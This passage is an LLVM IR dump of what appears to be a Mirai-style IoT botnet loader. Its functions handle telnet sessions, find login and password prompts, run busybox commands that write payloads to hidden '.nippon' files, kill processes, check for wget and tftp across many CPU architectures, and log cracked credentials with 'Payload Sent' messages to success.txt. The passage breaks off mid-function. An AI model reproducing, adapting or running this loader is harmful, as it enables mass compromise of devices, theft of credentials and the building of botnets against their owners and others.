; ModuleID = 'host/ir_O1/Sythe.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.connection = type { %union.pthread_mutex_t, %struct.server*, %struct.binary*, %struct.telnet_info, i32, i32, i64, i32, %struct.anon, i16, i16, i8, i8, i8, i8, [8192 x i8] }
%union.pthread_mutex_t = type { %struct.__pthread_mutex_s }
%struct.__pthread_mutex_s = type { i32, i32, i32, i32, i32, i16, i16, %struct.__pthread_internal_list }
%struct.__pthread_internal_list = type { %struct.__pthread_internal_list*, %struct.__pthread_internal_list* }
%struct.server = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i8*, i8*, %struct.server_worker*, %struct.connection**, i32*, i64, i16, i8, i8, i32 }
%struct.server_worker = type { %struct.server*, i32, i64, i8 }
%struct.binary = type { [6 x i8], i32, i8** }
%struct.telnet_info = type { [32 x i8], [32 x i8], [6 x i8], [32 x i8], i32, i16, i32, i8, i8 }
%struct.anon = type { [512 x i8], i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }

@fileeeee = common local_unnamed_addr global %struct._IO_FILE* null, align 8
@.str = private unnamed_addr constant [13 x i8] c"srv == NULL\0A\00", align 1
@stderr = external local_unnamed_addr global %struct._IO_FILE*, align 8
@.str.1 = private unnamed_addr constant [42 x i8] c"Payload Sent --> %d.%d.%d.%d:%d %s:%s %s\0A\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"success.txt\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.4 = private unnamed_addr constant [22 x i8] c"%d.%d.%d.%d:%d %s:%s\0A\00", align 1
@connection_consume_iacs.tmp1 = private unnamed_addr constant [3 x i8] c"\FF\FB\1F", align 1
@connection_consume_iacs.tmp2 = private unnamed_addr constant [9 x i8] c"\FF\FA\1F\00P\00\18\FF\F0", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"enter\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.8 = private unnamed_addr constant [24 x i8] c"ECCHI: applet not found\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"init\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"[init]\00", align 1
@.str.11 = private unnamed_addr constant [26 x i8] c"/bin/busybox kill -9 %d\0D\0A\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.13 = private unnamed_addr constant [3 x i8] c"rw\00", align 1
@.str.14 = private unnamed_addr constant [100 x i8] c"/bin/busybox echo -e '%s%s' > %s/.nippon; /bin/busybox cat %s/.nippon; /bin/busybox rm %s/.nippon\0D\0A\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"\5Cx6b\5Cx61\5Cx6d\5Cx69\00", align 1
@.str.16 = private unnamed_addr constant [108 x i8] c"/bin/busybox echo -e '%s/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon\0D\0A\00", align 1
@.str.17 = private unnamed_addr constant [21 x i8] c"/bin/busybox ECCHI\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [5 x i8] c"kami\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.20 = private unnamed_addr constant [36 x i8] c"rm %s/.t; rm %s/.sh; rm %s/.human\0D\0A\00", align 1
@.str.21 = private unnamed_addr constant [4 x i8] c"ELF\00", align 1
@.str.22 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.23 = private unnamed_addr constant [5 x i8] c"mpsl\00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.26 = private unnamed_addr constant [4 x i8] c"spc\00", align 1
@.str.27 = private unnamed_addr constant [5 x i8] c"m68k\00", align 1
@.str.28 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.29 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.30 = private unnamed_addr constant [6 x i8] c"ARMv7\00", align 1
@.str.31 = private unnamed_addr constant [6 x i8] c"ARMv6\00", align 1
@.str.32 = private unnamed_addr constant [5 x i8] c"arm7\00", align 1
@.str.33 = private unnamed_addr constant [23 x i8] c"wget: applet not found\00", align 1
@.str.34 = private unnamed_addr constant [23 x i8] c"tftp: applet not found\00", align 1
@.str.36 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.37 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.35 = private unnamed_addr constant [44 x i8] c"echo -ne '%s' %s upnp; /bin/busybox ECCHI\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [18 x i8] c"Permission denied\00", align 1
@.str.39 = private unnamed_addr constant [8 x i8] c"timeout\00", align 1
@.str.40 = private unnamed_addr constant [15 x i8] c"illegal option\00", align 1
@.str.41 = private unnamed_addr constant [24 x i8] c"IHCCE: applet not found\00", align 1
@.str.42 = private unnamed_addr constant [15 x i8] c"listening tun0\00", align 1
@str = private unnamed_addr constant [12 x i8] c"srv == NULL\00"

; Function Attrs: noinline nounwind uwtable
define void @connection_open(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 0
  %3 = tail call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %2) #7
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  store i16 0, i16* %4, align 8
  %5 = tail call i64 @time(i64* null) #7
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 6
  store i64 %5, i64* %6, align 8
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 10
  store i16 10, i16* %7, align 2
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 5
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 7
  store i32 1, i32* %9, align 8
  %10 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 12
  store i8 0, i8* %10, align 1
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 11
  store i8 1, i8* %11, align 4
  %12 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 2
  store %struct.binary* null, %struct.binary** %12, align 8
  store i32 0, i32* %8, align 4
  %13 = tail call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* %2) #7
  ret void
}

; Function Attrs: nounwind
declare i32 @pthread_mutex_lock(%union.pthread_mutex_t*) local_unnamed_addr #1

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @pthread_mutex_unlock(%union.pthread_mutex_t*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @connection_close(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 0
  %3 = tail call i32 @pthread_mutex_lock(%union.pthread_mutex_t* %2) #7
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 11
  %5 = load i8, i8* %4, align 4
  %6 = icmp eq i8 %5, 0
  br i1 %6, label %56, label %7

; <label>:7:                                      ; preds = %1
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 8, i32 0, i64 0
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 6
  store i64 0, i64* %9, align 8
  store i8 0, i8* %4, align 4
  %10 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 13
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 1
  call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 518, i32 4, i1 false)
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 8194, i32 2, i1 false)
  %12 = load %struct.server*, %struct.server** %11, align 8
  %13 = icmp eq %struct.server* %12, null
  br i1 %13, label %14, label %15

; <label>:14:                                     ; preds = %7
  %puts = tail call i32 @puts(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @str, i64 0, i64 0))
  br label %69

; <label>:15:                                     ; preds = %7
  %16 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 12
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 0
  br i1 %18, label %53, label %19

; <label>:19:                                     ; preds = %15
  %20 = getelementptr inbounds %struct.server, %struct.server* %12, i64 0, i32 7
  %21 = atomicrmw add i32* %20, i32 1 seq_cst
  %22 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %23 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 4
  %24 = load i32, i32* %23, align 8
  %25 = and i32 %24, 255
  %26 = lshr i32 %24, 8
  %27 = and i32 %26, 255
  %28 = lshr i32 %24, 16
  %29 = and i32 %28, 255
  %30 = lshr i32 %24, 24
  %31 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 5
  %32 = load i16, i16* %31, align 4
  %33 = zext i16 %32 to i32
  %34 = tail call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %33) #7
  %35 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 0, i64 0
  %36 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 1, i64 0
  %37 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 3, i32 2, i64 0
  %38 = tail call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %22, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.1, i64 0, i64 0), i32 %25, i32 %27, i32 %29, i32 %30, i32 %34, i8* %35, i8* %36, i8* %37) #8
  %39 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  store %struct._IO_FILE* %39, %struct._IO_FILE** @fileeeee, align 8
  %40 = load i32, i32* %23, align 8
  %41 = and i32 %40, 255
  %42 = lshr i32 %40, 8
  %43 = and i32 %42, 255
  %44 = lshr i32 %40, 16
  %45 = and i32 %44, 255
  %46 = lshr i32 %40, 24
  %47 = load i16, i16* %31, align 4
  %48 = zext i16 %47 to i32
  %49 = tail call i32 (i32, ...) bitcast (i32 (...)* @ntohs to i32 (i32, ...)*)(i32 %48) #7
  %50 = tail call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %39, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.4, i64 0, i64 0), i32 %41, i32 %43, i32 %45, i32 %46, i32 %49, i8* %35, i8* %36)
  %51 = load %struct._IO_FILE*, %struct._IO_FILE** @fileeeee, align 8
  %52 = tail call i32 @fclose(%struct._IO_FILE* %51)
  br label %56

; <label>:53:                                     ; preds = %15
  %54 = getelementptr inbounds %struct.server, %struct.server* %12, i64 0, i32 8
  %55 = atomicrmw add i32* %54, i32 1 seq_cst
  br label %56

; <label>:56:                                     ; preds = %1, %19, %53
  %57 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 7
  store i32 0, i32* %57, align 8
  %58 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %59 = load i32, i32* %58, align 8
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %67, label %61

; <label>:61:                                     ; preds = %56
  %62 = tail call i32 (i32, ...) bitcast (i32 (...)* @close to i32 (i32, ...)*)(i32 %59) #7
  store i32 -1, i32* %58, align 8
  %63 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 1
  %64 = load %struct.server*, %struct.server** %63, align 8
  %65 = getelementptr inbounds %struct.server, %struct.server* %64, i64 0, i32 1
  %66 = atomicrmw sub i32* %65, i32 1 seq_cst
  br label %67

; <label>:67:                                     ; preds = %56, %61
  %68 = tail call i32 @pthread_mutex_unlock(%union.pthread_mutex_t* nonnull %2) #7
  br label %69

; <label>:69:                                     ; preds = %67, %14
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

declare i32 @ntohs(...) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @fprintf(%struct._IO_FILE* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #1

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #1

declare i32 @close(...) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_iacs(%struct.connection*) local_unnamed_addr #0 {
  %2 = alloca [3 x i8], align 1
  %3 = alloca [9 x i8], align 1
  %4 = getelementptr inbounds [3 x i8], [3 x i8]* %2, i64 0, i64 0
  %5 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %6 = load i16, i16* %5, align 8
  %7 = icmp eq i16 %6, 0
  br i1 %7, label %._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %1
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %10 = getelementptr inbounds [9 x i8], [9 x i8]* %3, i64 0, i64 0
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  br label %12

; <label>:12:                                     ; preds = %.lr.ph, %.backedge
  %.03135 = phi i8* [ %8, %.lr.ph ], [ %.031.be, %.backedge ]
  %.03234 = phi i32 [ 0, %.lr.ph ], [ %.032.be, %.backedge ]
  %13 = load i8, i8* %.03135, align 1
  %14 = icmp eq i8 %13, -1
  br i1 %14, label %15, label %._crit_edge.loopexit

; <label>:15:                                     ; preds = %12
  %16 = call fastcc signext i8 @can_consume(%struct.connection* nonnull %0, i8* nonnull %.03135, i32 1)
  %17 = icmp eq i8 %16, 0
  br i1 %17, label %._crit_edge.loopexit, label %18

; <label>:18:                                     ; preds = %15
  %19 = getelementptr inbounds i8, i8* %.03135, i64 1
  %20 = load i8, i8* %19, align 1
  switch i8 %20, label %41 [
    i8 -1, label %21
    i8 -3, label %27
  ]

; <label>:21:                                     ; preds = %18
  %22 = getelementptr inbounds i8, i8* %.03135, i64 2
  %23 = add nsw i32 %.03234, 2
  br label %.backedge

.backedge:                                        ; preds = %21, %34, %52
  %.032.be = phi i32 [ %23, %21 ], [ %56, %52 ], [ %36, %34 ]
  %.031.be = phi i8* [ %22, %21 ], [ %55, %52 ], [ %35, %34 ]
  %24 = load i16, i16* %5, align 8
  %25 = zext i16 %24 to i32
  %26 = icmp slt i32 %.032.be, %25
  br i1 %26, label %12, label %._crit_edge.loopexit

; <label>:27:                                     ; preds = %18
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @connection_consume_iacs.tmp1, i64 0, i64 0), i64 3, i32 1, i1 false)
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %10, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @connection_consume_iacs.tmp2, i64 0, i64 0), i64 9, i32 1, i1 false)
  %28 = call fastcc signext i8 @can_consume(%struct.connection* nonnull %0, i8* nonnull %.03135, i32 2)
  %29 = icmp eq i8 %28, 0
  br i1 %29, label %._crit_edge.loopexit, label %30

; <label>:30:                                     ; preds = %27
  %31 = getelementptr inbounds i8, i8* %.03135, i64 2
  %32 = load i8, i8* %31, align 1
  %33 = icmp eq i8 %32, 31
  br i1 %33, label %34, label %41

; <label>:34:                                     ; preds = %30
  %35 = getelementptr inbounds i8, i8* %.03135, i64 3
  %36 = add nsw i32 %.03234, 3
  %37 = load i32, i32* %11, align 8
  %38 = call i64 @send(i32 %37, i8* nonnull %4, i64 3, i32 16384) #7
  %39 = load i32, i32* %11, align 8
  %40 = call i64 @send(i32 %39, i8* nonnull %10, i64 9, i32 16384) #7
  br label %.backedge

; <label>:41:                                     ; preds = %18, %30
  %42 = call fastcc signext i8 @can_consume(%struct.connection* %0, i8* nonnull %.03135, i32 2)
  %43 = icmp eq i8 %42, 0
  br i1 %43, label %._crit_edge.loopexit, label %.preheader

.preheader:                                       ; preds = %41
  %44 = load i8, i8* %.03135, align 1
  switch i8 %44, label %.preheader.144 [
    i8 -3, label %45
    i8 -5, label %.sink.split
  ]

; <label>:45:                                     ; preds = %.preheader
  br label %.sink.split

.sink.split:                                      ; preds = %.preheader, %45
  %.sink = phi i8 [ -4, %45 ], [ -3, %.preheader ]
  store i8 %.sink, i8* %.03135, align 1
  br label %.preheader.144

.preheader.144:                                   ; preds = %.preheader, %.sink.split
  %46 = getelementptr inbounds i8, i8* %.03135, i64 1
  %47 = load i8, i8* %46, align 1
  switch i8 %47, label %.preheader.245 [
    i8 -3, label %48
    i8 -5, label %.sink.split.1
  ]

._crit_edge.loopexit:                             ; preds = %27, %41, %15, %12, %.backedge
  %.032.lcssa.ph = phi i32 [ %.03234, %27 ], [ %.03234, %41 ], [ %.03234, %15 ], [ %.03234, %12 ], [ %.032.be, %.backedge ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %.032.lcssa = phi i32 [ 0, %1 ], [ %.032.lcssa.ph, %._crit_edge.loopexit ]
  ret i32 %.032.lcssa

; <label>:48:                                     ; preds = %.preheader.144
  br label %.sink.split.1

.sink.split.1:                                    ; preds = %48, %.preheader.144
  %.sink.1 = phi i8 [ -4, %48 ], [ -3, %.preheader.144 ]
  store i8 %.sink.1, i8* %46, align 1
  br label %.preheader.245

.preheader.245:                                   ; preds = %.sink.split.1, %.preheader.144
  %49 = getelementptr inbounds i8, i8* %.03135, i64 2
  %50 = load i8, i8* %49, align 1
  switch i8 %50, label %52 [
    i8 -3, label %51
    i8 -5, label %.sink.split.2
  ]

; <label>:51:                                     ; preds = %.preheader.245
  br label %.sink.split.2

.sink.split.2:                                    ; preds = %51, %.preheader.245
  %.sink.2 = phi i8 [ -4, %51 ], [ -3, %.preheader.245 ]
  store i8 %.sink.2, i8* %49, align 1
  br label %52

; <label>:52:                                     ; preds = %.sink.split.2, %.preheader.245
  %53 = load i32, i32* %9, align 8
  %54 = call i64 @send(i32 %53, i8* nonnull %.03135, i64 3, i32 16384) #7
  %55 = getelementptr inbounds i8, i8* %.03135, i64 3
  %56 = add nsw i32 %.03234, 3
  br label %.backedge
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc signext i8 @can_consume(%struct.connection* readonly, i8* readnone, i32) unnamed_addr #4 {
  %4 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %5 = load i16, i16* %4, align 8
  %6 = zext i16 %5 to i64
  %7 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %6
  %8 = sext i32 %2 to i64
  %9 = getelementptr inbounds i8, i8* %1, i64 %8
  %10 = icmp ult i8* %9, %7
  %11 = zext i1 %10 to i8
  ret i8 %11
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #2

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_login_prompt(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %3 = load i16, i16* %2, align 8
  %4 = zext i16 %3 to i64
  br label %5

; <label>:5:                                      ; preds = %1, %8
  %indvars.iv = phi i64 [ %4, %1 ], [ %indvars.iv.next, %8 ]
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv
  %7 = load i8, i8* %6, align 1
  switch i8 %7, label %8 [
    i8 58, label %.loopexit.loopexit
    i8 62, label %.loopexit.loopexit
    i8 36, label %.loopexit.loopexit
    i8 35, label %.loopexit.loopexit
    i8 37, label %.loopexit.loopexit
  ]

; <label>:8:                                      ; preds = %5
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %9 = icmp sgt i64 %indvars.iv, 0
  br i1 %9, label %5, label %10

; <label>:10:                                     ; preds = %8
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %12 = load i16, i16* %2, align 8
  %13 = zext i16 %12 to i32
  %14 = tail call i32 @util_memsearch(i8* %11, i32 %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i32 4)
  %15 = icmp eq i32 %14, -1
  br i1 %15, label %16, label %.loopexit

; <label>:16:                                     ; preds = %10
  %17 = tail call i32 @util_memsearch(i8* %11, i32 %13, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i32 5)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %5, %5, %5, %5, %5
  %18 = trunc i64 %indvars.iv to i32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %16, %10
  %.1 = phi i32 [ %14, %10 ], [ %17, %16 ], [ %18, %.loopexit.loopexit ]
  %19 = icmp eq i32 %.1, -1
  %..1 = select i1 %19, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_password_prompt(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %3 = load i16, i16* %2, align 8
  %4 = zext i16 %3 to i64
  br label %5

; <label>:5:                                      ; preds = %1, %8
  %indvars.iv = phi i64 [ %4, %1 ], [ %indvars.iv.next, %8 ]
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv
  %7 = load i8, i8* %6, align 1
  switch i8 %7, label %8 [
    i8 58, label %.loopexit.loopexit
    i8 62, label %.loopexit.loopexit
    i8 36, label %.loopexit.loopexit
    i8 35, label %.loopexit.loopexit
    i8 37, label %.loopexit.loopexit
  ]

; <label>:8:                                      ; preds = %5
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %9 = icmp sgt i64 %indvars.iv, 0
  br i1 %9, label %5, label %10

; <label>:10:                                     ; preds = %8
  %11 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %12 = load i16, i16* %2, align 8
  %13 = zext i16 %12 to i32
  %14 = tail call i32 @util_memsearch(i8* %11, i32 %13, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i64 0, i64 0), i32 7)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %5, %5, %5, %5, %5
  %15 = trunc i64 %indvars.iv to i32
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %10
  %.1 = phi i32 [ %14, %10 ], [ %15, %.loopexit.loopexit ]
  %16 = icmp eq i32 %.1, -1
  %..1 = select i1 %16, i32 0, i32 %.1
  ret i32 %..1
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_prompt(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %3 = load i16, i16* %2, align 8
  %4 = zext i16 %3 to i64
  br label %5

; <label>:5:                                      ; preds = %1, %9
  %indvars.iv = phi i64 [ %4, %1 ], [ %indvars.iv.next, %9 ]
  %6 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv
  %7 = load i8, i8* %6, align 1
  %8 = trunc i64 %indvars.iv to i32
  switch i8 %7, label %9 [
    i8 58, label %11
    i8 62, label %11
    i8 36, label %11
    i8 35, label %11
    i8 37, label %11
  ]

; <label>:9:                                      ; preds = %5
  %indvars.iv.next = add nsw i64 %indvars.iv, -1
  %10 = icmp sgt i64 %indvars.iv, 0
  br i1 %10, label %5, label %11

; <label>:11:                                     ; preds = %5, %5, %5, %5, %5, %9
  %.0 = phi i32 [ -1, %9 ], [ %8, %5 ], [ %8, %5 ], [ %8, %5 ], [ %8, %5 ], [ %8, %5 ]
  %12 = icmp eq i32 %.0, -1
  %..0 = select i1 %12, i32 0, i32 %.0
  ret i32 %..0
}

; Function Attrs: noinline norecurse nounwind readonly uwtable
define i32 @connection_consume_verify_login(%struct.connection* nocapture readonly) local_unnamed_addr #4 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  %. = select i1 %7, i32 0, i32 %6
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @connection_consume_psoutput(%struct.connection*) local_unnamed_addr #0 {
  %2 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 0
  %3 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 9
  %4 = load i16, i16* %3, align 8
  %5 = zext i16 %4 to i32
  %6 = tail call i32 @util_memsearch(i8* %2, i32 %5, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.8, i64 0, i64 0), i32 23)
  %7 = icmp eq i32 %6, -1
  %8 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  %9 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 4
  br label %10

; <label>:10:                                     ; preds = %72, %1
  %indvars.iv138 = phi i64 [ %indvars.iv.next139, %72 ], [ 0, %1 ]
  %.093 = phi i8* [ %.194, %72 ], [ %2, %1 ]
  br i1 %7, label %11, label %14

; <label>:11:                                     ; preds = %10
  %12 = load i16, i16* %3, align 8
  %13 = zext i16 %12 to i32
  br label %14

; <label>:14:                                     ; preds = %10, %11
  %15 = phi i32 [ %13, %11 ], [ %6, %10 ]
  %16 = sext i32 %15 to i64
  %17 = icmp slt i64 %indvars.iv138, %16
  br i1 %17, label %18, label %73

; <label>:18:                                     ; preds = %14
  %19 = getelementptr inbounds %struct.connection, %struct.connection* %0, i64 0, i32 15, i64 %indvars.iv138
  %20 = load i8, i8* %19, align 1
  switch i8 %20, label %72 [
    i8 13, label %21
    i8 10, label %22
  ]

; <label>:21:                                     ; preds = %18
  store i8 0, i8* %19, align 1
  br label %72

; <label>:22:                                     ; preds = %18
  store i8 0, i8* %19, align 1
  %23 = ptrtoint i8* %19 to i64
  %24 = ptrtoint i8* %.093 to i64
  %25 = sub i64 %23, %24
  %26 = icmp sgt i64 %25, 0
  br i1 %26, label %.lr.ph127.preheader, label %.thread

.lr.ph127.preheader:                              ; preds = %22
  br label %.lr.ph127

.lr.ph127:                                        ; preds = %.lr.ph127.preheader, %35
  %indvars.iv134 = phi i64 [ %indvars.iv.next135, %35 ], [ 0, %.lr.ph127.preheader ]
  %.095126 = phi i8* [ %.2, %35 ], [ null, %.lr.ph127.preheader ]
  %.097125 = phi i8* [ %.299, %35 ], [ null, %.lr.ph127.preheader ]
  %.0100124 = phi i8 [ %.1101, %35 ], [ 0, %.lr.ph127.preheader ]
  %.0102123 = phi i8 [ %.3, %35 ], [ 0, %.lr.ph127.preheader ]
  %27 = getelementptr inbounds i8, i8* %.093, i64 %indvars.iv134
  %28 = load i8, i8* %27, align 1
  switch i8 %28, label %31 [
    i8 32, label %29
    i8 9, label %29
    i8 0, label %29
  ]

; <label>:29:                                     ; preds = %.lr.ph127, %.lr.ph127, %.lr.ph127
  %notlhs = icmp ne i8 %.0102123, 0
  %notrhs = icmp eq i8 %.0100124, 0
  %not.or.cond = and i1 %notlhs, %notrhs
  %30 = zext i1 %not.or.cond to i8
  %.0102. = add i8 %30, %.0102123
  store i8 0, i8* %27, align 1
  br label %35

; <label>:31:                                     ; preds = %.lr.ph127
  %32 = icmp eq i8 %.0102123, 0
  br i1 %32, label %35, label %33

; <label>:33:                                     ; preds = %31
  %.0102.off = add i8 %.0102123, -3
  %or.cond109.not = icmp ugt i8 %.0102.off, 2
  %34 = icmp eq i8 %.0100124, 0
  %or.cond110 = or i1 %or.cond109.not, %34
  %.095. = select i1 %or.cond110, i8* %.095126, i8* %27
  br label %35

; <label>:35:                                     ; preds = %31, %33, %29
  %.3 = phi i8 [ %.0102., %29 ], [ %.0102123, %33 ], [ 1, %31 ]
  %.1101 = phi i8 [ 1, %29 ], [ 0, %33 ], [ 0, %31 ]
  %.299 = phi i8* [ %.097125, %29 ], [ %.097125, %33 ], [ %27, %31 ]
  %.2 = phi i8* [ %.095126, %29 ], [ %.095., %33 ], [ %.095126, %31 ]
  %indvars.iv.next135 = add nuw nsw i64 %indvars.iv134, 1
  %exitcond = icmp eq i64 %indvars.iv.next135, %25
  br i1 %exitcond, label %._crit_edge, label %.lr.ph127

._crit_edge:                                      ; preds = %35
  %36 = icmp ne i8* %.299, null
  %37 = icmp ne i8* %.2, null
